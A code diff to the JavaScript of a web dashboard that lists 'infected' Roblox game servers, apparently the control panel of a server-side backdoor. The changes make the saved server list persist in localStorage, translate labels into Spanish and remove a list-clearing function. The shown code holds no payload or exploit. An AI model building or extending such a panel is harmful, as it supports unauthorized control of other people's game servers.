@@ -23,7 +23,7 @@ document.addEventListener('DOMContentLoaded', () => {
     createParticles();
     updateStatsUI();
 
-    // Actualizar cada 5 segundos para capturar nuevos servidores
+    // Actualizar juegos cada 5 segundos sin borrar los existentes
     setInterval(refreshGames, 5000);
 });
 
@@ -246,7 +246,7 @@ function sendToEditor(code) {
 }
 
 // ==========================================
-// --- GAMES (PERSISTENCIA TOTAL SS) ---
+// --- GAMES (PERSISTENCIA AGRESIVA) ---
 // ==========================================
 async function refreshGames() {
     const container = document.getElementById('games-container');
@@ -256,28 +256,28 @@ async function refreshGames() {
     try {
         const response = await fetch('/api/games?t=' + Date.now());
         
-        // Cargamos la base de datos guardada en el navegador
+        // 1. Cargamos lo que ya teníamos guardado en el navegador
         let persistentDB = JSON.parse(localStorage.getItem('ss_total_db')) || [];
 
         if (response.ok) {
             const serverGames = await response.json();
 
-            // Si el servidor detecta juegos, los guardamos en el almacenamiento local
+            // 2. Si el servidor devuelve juegos, los unimos a nuestra lista sin duplicados
             if (Array.isArray(serverGames) && serverGames.length > 0) {
                 serverGames.forEach(newG => {
                     const index = persistentDB.findIndex(saved => saved.jobId === newG.jobId);
                     if (index === -1) {
-                        persistentDB.unshift(newG); // Si es nuevo, va al principio
+                        persistentDB.unshift(newG); // Añadimos nuevos arriba
                     } else {
-                        persistentDB[index] = newG; // Si ya existe, actualizamos datos
+                        persistentDB[index] = newG; // Actualizamos datos del existente
                     }
                 });
-                // Guardamos la lista "blindada" en el localStorage
+                // Guardamos la lista actualizada
                 localStorage.setItem('ss_total_db', JSON.stringify(persistentDB));
             }
         }
 
-        // Siempre usamos persistentDB para renderizar, así nunca se queda vacío
+        // 3. Renderizamos siempre basándonos en persistentDB (nunca estará vacío si ya hubo juegos)
         if(statGames) statGames.innerText = persistentDB.length;
 
         if (persistentDB.length > 0) {
@@ -298,7 +298,7 @@ async function refreshGames() {
                              onerror="this.src='https://tr.rbxcdn.com/38c353386000e311a268e37d97745778/150/150/Image/Png'"
                              class="w-14 h-14 rounded-lg border border-white/10 object-cover">
                         <div class="overflow-hidden">
-                            <h3 class="text-lg font-bold text-white truncate">${g.name || 'Infected Server'}</h3>
+                            <h3 class="text-lg font-bold text-white truncate">${g.name || 'Server Infectado'}</h3>
                             <p class="text-zinc-500 text-[10px]">ID: ${g.gameId}</p>
                         </div>
                     </div>
@@ -322,19 +322,10 @@ async function refreshGames() {
                 container.appendChild(nav);
             }
         } else {
-            container.innerHTML = '<p class="text-zinc-500 py-10 text-center col-span-full">No games infected yet.</p>';
+            container.innerHTML = '<p class="text-zinc-500 py-10 text-center col-span-full">Esperando conexión de servidores...</p>';
         }
     } catch (err) {
-        console.error("Fetch error:", err);
-    }
-}
-
-// Para limpiar la lista manualmente si se llena de basura
-function clearGamesList() {
-    if(confirm("¿Borrar todos los servidores guardados?")) {
-        localStorage.removeItem('ss_total_db');
-        refreshGames();
-        notify("List Cleared 🗑️");
+        console.error("Error cargando juegos:", err);
     }
 }
 
